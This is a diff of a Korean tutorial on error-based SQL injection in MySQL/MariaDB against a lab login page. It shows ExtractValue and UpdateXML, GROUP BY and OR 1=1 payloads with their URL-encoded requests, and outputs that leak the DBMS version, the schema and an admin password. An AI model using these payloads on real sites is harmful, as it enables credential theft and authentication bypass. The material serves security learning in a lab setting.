@@ -8,21 +8,7 @@ SQL 쿼리 중 의도적으로 오류를 발생시키고 에러 메세지를 통
 
 **1. [환경 구성](#환경-구성)**
 
-**2. [ExtractValue](#ExtractValue)**
-
- - [DBMS 버전 확인(ExtractValue)](#DBMS-버전-확인(ExtractValue))
-
- - [DBMS 계정 확인](#DBMS-계정-확인)
-
- - [데이터베이스 이름 확인](#데이터베이스-이름-확인)
-
- - [테이블 이름 확인](#테이블-이름-확인)
-
- - [칼럼 이름 확인](#칼럼-이름-확인)
-
- - [데이터 확인](#데이터-확인)
-
-**3. [UpdateXML](#UpdateXML)**
+**2. [ExtractValue와 UpdateXML](#ExtractValue와-UpdateXML)**
 
  - [DBMS 버전 확인](#DBMS-버전-확인)
 
@@ -32,9 +18,15 @@ SQL 쿼리 중 의도적으로 오류를 발생시키고 에러 메세지를 통
 
  - [테이블 이름 확인](#테이블-이름-확인)
 
- - [칼럼 이름 확인](#칼럼-이름-확인)
+ - [컬럼 이름 확인](#컬럼-이름-확인)
 
  - [데이터 확인](#데이터-확인)
+
+**3. [GROUP BY](#GROUP-BY)**
+
+ - [컬럼 이름 부분 확인](#컬럼-이름-부분-확인)
+
+**4. [논리적 에러](#논리적-에러)**
 
 
 # **환경 구성**
@@ -120,17 +112,17 @@ SQLi(SQL Injection)에 취약한 페이지를 생성하자.
 
 # **ExtractValue**
 
-ExtractValue함수의 인자 중 두번째 인자의 형식오류로 다양한 정보를 확인할 수 있다.
+ExtractValue와 UpdateXML함수의 인자 중 두번째 인자의 형식오류로 다양한 정보를 확인할 수 있다.
 
-## **DBMS 버전 확인(ExtractValue)**
+## **DBMS 버전 확인**
 
 에러 메세지에 DBMS의 버전을 출력하도록 유도해보자.
 
 | data	| value	|
 | :---	| :--- 	|
-| ID	| ' AND ExtractValue(0,CONCAT(0x3a,VERSION()))# |
+| ID	| ' AND ExtractValue(0,CONCAT(0x3a,VERSION()))#<br>' AND UpdateXML(0,CONCAT(0x3a,VERSION()),0)# |
 | PW	| 아무 값(123) |
-| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2CVERSION%28%29%29%29%23&password=123 |
+| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2CVERSION%28%29%29%29%23&password=123<br>http://192.168.0.58/index.php?userid=%27+AND+UpdateXML%280%2CCONCAT%280x3a%2CVERSION%28%29%29%2C0%29%23&password=123 |
 
 결과는 다음과 같다.
 
@@ -142,9 +134,9 @@ ExtractValue함수의 인자 중 두번째 인자의 형식오류로 다양한 �
 
 | data	| value	|
 | :---	| :--- 	|
-| ID	| ' AND ExtractValue(0,CONCAT(0x3a,USER()))# |
+| ID	| ' AND ExtractValue(0,CONCAT(0x3a,USER()))#<br>' AND UpdateXML(0,CONCAT(0x3a,USER()),0)# |
 | PW	| 아무 값(123) |
-| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2CUSER%28%29%29%29%23&password=123 |
+| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2CUSER%28%29%29%29%23&password=123<br>http://192.168.0.58/index.php?userid=%27+AND+UpdateXML%280%2CCONCAT%280x3a%2CUSER%28%29%29%2C0%29%23&password=123 |
 
 결과는 다음과 같다.
 
@@ -156,9 +148,9 @@ ExtractValue함수의 인자 중 두번째 인자의 형식오류로 다양한 �
 
 | data	| value	|
 | :---	| :--- 	|
-| ID	| ' AND ExtractValue(0,CONCAT(0x3a,DATABASE()))# |
+| ID	| ' AND ExtractValue(0,CONCAT(0x3a,DATABASE()))#<br>' AND UpdateXML(0,CONCAT(0x3a,DATABASE()),0)# |
 | PW	| 아무 값(123) |
-| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2CDATABASE%28%29%29%29%23&password=123 |
+| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2CDATABASE%28%29%29%29%23&password=123<br>http://192.168.0.58/index.php?userid=%27+AND+UpdateXML%280%2CCONCAT%280x3a%2CDATABASE%28%29%29%2C0%29%23&password=123 |
 
 결과는 다음과 같다.
 
@@ -172,31 +164,31 @@ ExtractValue함수의 인자 중 두번째 인자의 형식오류로 다양한 �
 
 | data	| value	|
 | :---	| :--- 	|
-| ID	| ' AND ExtractValue(0,CONCAT(0x3a,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="test" LIMIT 0,1)))# |
+| ID	| ' AND ExtractValue(0,CONCAT(0x3a,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="test" LIMIT 0,1)))#<br>' AND UpdateXML(0,CONCAT(0x3a,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="test" LIMIT 0,1)),0)# |
 | PW	| 아무 값(123) |
-| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2C%28SELECT+TABLE_NAME+FROM+information_schema.TABLES+WHERE+table_schema%3D%22test%22+LIMIT+0%2C1%29%29%29%23&password=123 |
+| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2C%28SELECT+TABLE_NAME+FROM+information_schema.TABLES+WHERE+table_schema%3D%22test%22+LIMIT+0%2C1%29%29%29%23&password=123<br>http://192.168.0.58/index.php?userid=%27+AND+UpdateXML%280%2CCONCAT%280x3a%2C%28SELECT+TABLE_NAME+FROM+information_schema.TABLES+WHERE+table_schema%3D%22test%22+LIMIT+0%2C1%29%29%29%23&password=123 |
 
 결과는 다음과 같다.
 
 	Login Failed : XPATH syntax error: '::user'
 
-## **칼럼 이름 확인**
+## **컬럼 이름 확인**
 
 에러 메세지에 사용하고 있는 데이터베이스의 칼럼의 수를 출력하도록 유도해보자.
 
-user 테이블은 mysql 데이터베이스의 기본 테이블에도 속해 있어 TABLE_SCHEMA를 조건에 걸어 확실하게 원하는 테이블의 칼럼 정보를 획득한다.
+user 테이블은 mysql 데이터베이스의 기본 테이블에도 속해 있어 TABLE_SCHEMA를 조건에 걸어 확실하게 원하는 테이블의 컬럼 정보를 획득한다.
 
 | data	| value	|
 | :---	| :--- 	|
-| ID	| ' AND ExtractValue(0,CONCAT(0x3a,(SELECT COUNT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME="user" AND TABLE_SCHEMA="test")))# |
+| ID	| ' AND ExtractValue(0,CONCAT(0x3a,(SELECT COUNT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME="user" AND TABLE_SCHEMA="test")))#<br>' AND UpdateXML(0,CONCAT(0x3a,(SELECT COUNT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME="user" AND TABLE_SCHEMA="test")),0)# |
 | PW	| 아무 값(123) |
-| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2C%28SELECT+COUNT%28COLUMN_NAME%29+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME%3D%22user%22+AND+TABLE_SCHEMA%3D%22test%22%29%29%29%23&password=123 |
+| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2C%28SELECT+COUNT%28COLUMN_NAME%29+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME%3D%22user%22+AND+TABLE_SCHEMA%3D%22test%22%29%29%29%23&password=123<br>http://192.168.0.58/index.php?userid=%27+AND+UpdateXML%280%2CCONCAT%280x3a%2C%28SELECT+COUNT%28COLUMN_NAME%29+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME%3D%22user%22+AND+TABLE_SCHEMA%3D%22test%22%29%29%2C0%29%23&password=123 |
 
 결과는 다음과 같다.
 
 	Login Failed : XPATH syntax error: ':2'
 
-LIMIT 0,1로 첫번째 칼럼 이름을 확인해보자.
+LIMIT 0,1로 첫번째 컬럼 이름을 확인해보자.
 
 | data	| value	|
 | :---	| :--- 	|
@@ -208,7 +200,7 @@ LIMIT 0,1로 첫번째 칼럼 이름을 확인해보자.
 
 	Login Failed : XPATH syntax error: ':id'
 
-LIMIT 1,1로 두번째 칼럼 이름을 확인해보자.
+LIMIT 1,1로 두번째 컬럼 이름을 확인해보자.
 
 | data	| value	|
 | :---	| :--- 	|
@@ -226,9 +218,9 @@ LIMIT 1,1로 두번째 칼럼 이름을 확인해보자.
 
 | data	| value	|
 | :---	| :--- 	|
-| ID	| ' AND ExtractValue(0,CONCAT(0x3a,(SELECT COUNT(id) FROM user)))# |
+| ID	| ' AND ExtractValue(0,CONCAT(0x3a,(SELECT COUNT(id) FROM user)))#<br>' AND UpdateXML(0,CONCAT(0x3a,(SELECT COUNT(id) FROM user)),0)# |
 | PW	| 아무 값(123) |
-| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2C%28SELECT+COUNT%28id%29+FROM+user%29%29%29%23&password=123 |
+| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2C%28SELECT+COUNT%28id%29+FROM+user%29%29%29%23&password=123<br>http://192.168.0.58/index.php?userid=%27+AND+UpdateXML%280%2CCONCAT%280x3a%2C%28SELECT+COUNT%28id%29+FROM+user%29%29%2C0%29%23&password=123 |
 
 결과는 다음과 같다.
 
@@ -238,56 +230,50 @@ LIMIT 1,1로 두번째 칼럼 이름을 확인해보자.
 
 | data	| value	|
 | :---	| :--- 	|
-| ID	| ' AND ExtractValue(0,CONCAT(0x3a,(SELECT CONCAT(id,0x3a,pw) FROM user)))# |
+| ID	| ' AND ExtractValue(0,CONCAT(0x3a,(SELECT CONCAT(id,0x3a,pw) FROM user)))#<br>' AND UpdateXML(0,CONCAT(0x3a,(SELECT CONCAT(id,0x3a,pw) FROM user)),0)# |
 | PW	| 아무 값(123) |
-| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2C%28SELECT+CONCAT%28id%2C0x3a%2Cpw%29+FROM+user%29%29%29%23&password=123 |
+| URL	| http://192.168.0.58/index.php?userid=%27+AND+ExtractValue%280%2CCONCAT%280x3a%2C%28SELECT+CONCAT%28id%2C0x3a%2Cpw%29+FROM+user%29%29%29%23&password=123<br>http://192.168.0.58/index.php?userid=%27+AND+UpdateXML%280%2CCONCAT%280x3a%2C%28SELECT+CONCAT%28id%2C0x3a%2Cpw%29+FROM+user%29%29%2C0%29%23&password=123 |
 
 결과는 다음과 같다.
 
 	Login Failed : XPATH syntax error: ':admin:helloworld'
 
+# **GROUP BY**
 
+GROUP BY 이후 컬럼 명을 적지 않고, HAVING 이나 ODER BY등을 바로 적으면 syntax에러가 나오며 뒤의 쿼리를 부분 확인할 수 있다.
 
-쿼리 에러 등 SQL 관련 에러를 발생시켜 정보를 획득해볼 수 있다.
+## **컬럼 이름 부분 확인**
 
-ID에 ' and hack()#을 넣고 PW에 아무값을 넣어보자.
-
-    http://192.168.0.58/index.php?userid=%27+and+hack%28%29%23&password=123
-
-데이터베이스 이름이 test임을 알 수 있게 된다.
-
-![](images/2022-05-31-16-06-41.png)
-
-ID에 ' group by having a#을 넣고 PW에 아무값을 넣어보자.
-
-    http://192.168.0.58/index.php?userid=%27+group+by+having+a%23&password=123
-
-SQL 쿼리 중 ID가 들어가는 뒤의 컬럼명을 알 수 있게 된다.
-
-![](images/2022-05-31-16-12-40.png)
-
-논리적 에러를 이용하여 테이블의 가장 먼저 출력되는 값을 얻을 수 있다.
-
-ID에 ' or true#을 넣고 PW에 아무값을 넣어보자.
-
-    http://192.168.0.58/index.php?id=%27+group+by+having+a%23&pw=123
-
-![](images/2022-05-31-17-06-22.png)
-
-# **UpdateXML**
-
-UpdateXML함수의 인자 중 두번째 인자의 형식오류로 다양한 정보를 확인할 수 있다.
-
-## **DBMS 버전 확인**
-
-에러 메세지에 DBMS의 버전을 출력하도록 유도해보자.
+에러 메세지에 칼럼을 출력하도록 유도해보자.
 
 | data	| value	|
 | :---	| :--- 	|
-| ID	| ' AND UpdateXML(0,CONCAT(0x3a,VERSION()),0)# |
+| ID	| ' GROUP BY HAVING# |
 | PW	| 아무 값(123) |
-| URL	| http://192.168.0.58/index.php?userid=%27+AND+UpdateXML%280%2CCONCAT%280x3a%2CVERSION%28%29%29%2C0%29%23&password=123 |
+| URL	| http://192.168.0.58/index.php?userid=%27+GROUP+BY+HAVING%23&password=123 |
 
 결과는 다음과 같다.
 
-	Login Failed : XPATH syntax error: ':10.3.34-MariaDB-0ubuntu0.20....'
+	Login Failed : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'HAVING#' and pw='123'' at line 1
+
+# **논리적 에러**
+
+테이블에서 조건(WHERE 절)을 충족시키는 데이터를 검색한다.
+
+그렇다면 조건을 충족해서 원하는 데이터를 추출하거나 조건 자체를 무력화시켜 모든 데이터를 추출해 볼 수 있다.
+
+조건을 충족하기 위한 데이터는 알 수 없으므로 조건 자체를 무력화 시켜보자.
+
+id는 ''로 데이터가 테이블에 없으므로 거짓이 되지만 1=1은 참이다. 이를 OR연산을 통해 WHERE절은 참이 되어 모든 데이터를 추출해 볼 수 있다.
+
+| data	| value	|
+| :---	| :--- 	|
+| ID	| ' OR 1=1 |
+| PW	| 아무 값(123) |
+| URL	| http://192.168.0.58/index.php?userid=%27+OR+1%3D1%23&password=123 |
+
+결과는 다음과 같다.
+
+	Welcome admin
+
+참은 1, 2>1, True과 같이 다양하게 표현해볼 수 있다.
